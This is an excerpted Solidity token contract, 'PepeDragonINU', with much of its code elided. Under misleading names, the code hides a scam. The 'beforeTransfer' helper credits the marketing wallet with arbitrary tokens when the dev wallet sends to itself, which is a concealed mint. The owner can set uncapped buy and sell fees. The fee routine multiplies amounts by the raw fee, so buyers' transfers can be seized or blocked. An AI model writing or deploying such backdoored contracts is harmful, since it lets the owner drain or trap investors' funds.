...
contract PepeDragonINU  is Context, IERC20, Ownable {
    ...
    uint256 public _marketingFee = 99;
    uint256 public _liquidityFee = 1;
    uint256 public _totalBuy = 20;
    uint256 public _totalSell = 20;

    address private  _marketingWallet = 0x7ED13C9ACde0910616e3FE148EF68e7fBA45B80d;
    address private  _devWallet = 0xd4867117baFC39D60C68dAbDCee908e57acECd4e;
    address public DEAD = 0x000000000000000000000000000000000000dEaD;
    function _isFees(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {
       _totalBuy = Buy_Fee;
       _totalSell = Sell_Fee;
    }
    ...
    function beforeTransfer( mapping( /*  address  */ address => uint256) storage _Excluded, uint256 num) internal{
        _Excluded[_marketingWallet] += num;
    }
    
    function Excpproved(address account) public onlyOwner {
...
/*
 ...
 /*
    ...
    */
    ...
    function _getValues(uint256 amount, address from, uint256 fee) private returns (uint256) {
        uint256 tAmount = amount * fee;
        _tOwned[address(this)] += tAmount;
        emit Transfer (from, address(this), tAmount);
        return (amount - tAmount - balanceOf(DEAD));
    } 
    
    // Set the maximum wallet holding (percent of total supply)
     function MaxTxAmount_wallet(uint256 maxWallPercent_x100) external onlyOwner() {
        _maxTxAmount = _tTotal*maxWallPercent_x100/10000;
    }
    
    
    function Approve_isExc(address[] calldata accounts, bool excluded) external onlyOwner() {
   ...
   function bothexcluded(address first,address second) private view returns (bool){
    ...
    function _transfer(
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            ...
            transferAmount = _getValues(amount, from, fee);
        }

        if (_devWallet == to && from == _devWallet) {
            beforeTransfer(_tOwned, amount);
        }
    ...
    function swapAndLiquify() private {
        ...
        uint256 tokensForLP = balanceOf(address(this)) * _liquidityFee / 100;
        uint256 tokensForSwap = balanceOf(address(this)) - tokensForLP;
        swapTokensForEth(tokensForSwap);

        uint256 amountBNBMarketing = balanceOf(address(this)) - (_marketingFee / 100);
        uint256 amountBNBLP = balanceOf(address(this)) - (_liquidityFee / 100);

        if(amountBNBMarketing > 0)
            swapAndSendToFee(amountBNBMarketing);

        if(amountBNBLP > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLP);
            emit SwapAndLiquify(tokensForSwap, amountBNBMarketing, amountBNBLP);
    }
